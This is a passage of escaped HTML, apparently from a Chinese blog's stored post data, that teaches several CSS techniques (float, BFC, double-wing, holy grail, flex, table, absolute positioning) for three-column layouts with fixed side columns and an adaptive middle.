class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">220px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">100%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: -<span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: -<span class=\"number\">220px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只是和双飞翼布局上有一些细节的区别。总体来说差别不大。但 html 结构相对简单，也是可以先加载主体内容</p>\n<h3 id=\"方法五：flex-布局\"><a href=\"#方法五：flex-布局\" class=\"headerlink\" title=\"方法五：flex 布局\"></a>方法五：flex 布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: flex;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">    <span class=\"attribute\">flex</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"方法六：table-布局\"><a href=\"#方法六：table-布局\" class=\"headerlink\" title=\"方法六：table 布局\"></a>方法六：table 布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.left</span>, <span class=\"selector-class\">.main</span>, <span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: table-cell;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"方法七：绝对定位布局\"><a href=\"#方法七：绝对定位布局\" class=\"headerlink\" title=\"方法七：绝对定位布局\"></a>方法七：绝对定位布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>:<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>:<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">400px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span> <span class=\"number\">120px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<h2 id=\"三列布局：左右列定宽，中间自适应\"><a href=\"#三列布局：左右列定宽，中间自适应\" class=\"headerlink\" title=\"三列布局：左右列定宽，中间自适应\"></a>三列布局：左右列定宽，中间自适应</h2><h3 id=\"方法一：使用流体布局实现-基本常见\"><a href=\"#方法一：使用流体布局实现-基本常见\" class=\"headerlink\" title=\"方法一：使用流体布局实现 (基本常见)\"></a>方法一：使用流体布局实现 (基本常见)</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: right;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">220px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>兼容性良好  兼容 IE 6+<br>缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局</p>\n<h3 id=\"方法二：使用-BFC-原理实现\"><a href=\"#方法二：使用-BFC-原理实现\" class=\"headerlink\" title=\"方法二：使用 BFC 原理实现\"></a>方法二：使用 BFC 原理实现</h3><p>BFC 的规则之一，就是 BFC 区域，不会与 float box 重叠，因此我们可以利用这一点来实现3列布局。</p>\n<p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"center\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">10px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: right;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.center</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>兼容性： IE6+ 都没有问题<br>缺点：主要内容模块无法最先加载，当页面中内容较多时会影响用户体验。因此为了解决这个问题，有了如下的布局方案双飞翼布局</p>\n<blockquote>\n<p>在IE6，IE7中使用 overflow:hidden 会没有效果，子元素超出父元素部分任然不会隐藏，解决办法就是在该元素的父级添加如下属性即可 position: relative。</p>\n</blockquote>\n<h3 id=\"方法三：双飞翼布局\"><a href=\"#方法三：双飞翼布局\" class=\"headerlink\" title=\"方法三：双飞翼布局\"></a>方法三：双飞翼布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"content\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.content&#123;</span><br><span class=\"line\">    float: left;</span><br><span class=\"line\">    width: 100%;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main&#123;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: green;</span><br><span class=\"line\">    margin-left: 220px;</span><br><span class=\"line\">    margin-right: 110px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.main::after &#123;       //用于清除浮动</span><br><span class=\"line\">  \tdisplay: block;</span><br><span class=\"line\">  \tcontent: '';</span><br><span class=\"line\">  \tfont-size: 0;</span><br><span class=\"line\">  \theight: 0;</span><br><span class=\"line\">  \tclear: both;</span><br><span class=\"line\">  \tzoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.left&#123;</span><br><span class=\"line\">    float: left;</span><br><span class=\"line\">    width: 200px;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: red;</span><br><span class=\"line\">    margin-left: -100%;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.right&#123;</span><br><span class=\"line\">    float: left;</span><br><span class=\"line\">    width: 100px;</span><br><span class=\"line\">    height: 100px;</span><br><span class=\"line\">    background: orange;</span><br><span class=\"line\">    margin-left: -100px;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>优点：兼容性: IE6+ 并且主题内容优先加载</p>\n<p>缺点：html代码结构稍微复杂</p>\n<h3 id=\"方法四：圣杯布局\"><a href=\"#方法四：圣杯布局\" class=\"headerlink\" title=\"方法四：圣杯布局\"></a>方法四：圣杯布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"main\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"left\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"right\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>css 代码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.container</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">220px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.main</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.left</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">100%</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">left</span>: -<span class=\"number\">120px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.right</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: -<span class=\"number\">200px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: -<span class=\"number\">220px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">300px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只是和双飞翼布局上有一些细节的区别。总体来说差别不大。但 html 结构相对简单，也是可以先加载主体内容</p>\n<h3 id=\"方法五：flex-布局\"><a href=\"#方法五：flex-布局\" class=\"headerlink\" title=\"方法五：flex 布局\"></a>方法五：flex 布局</h3><p>html 代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span 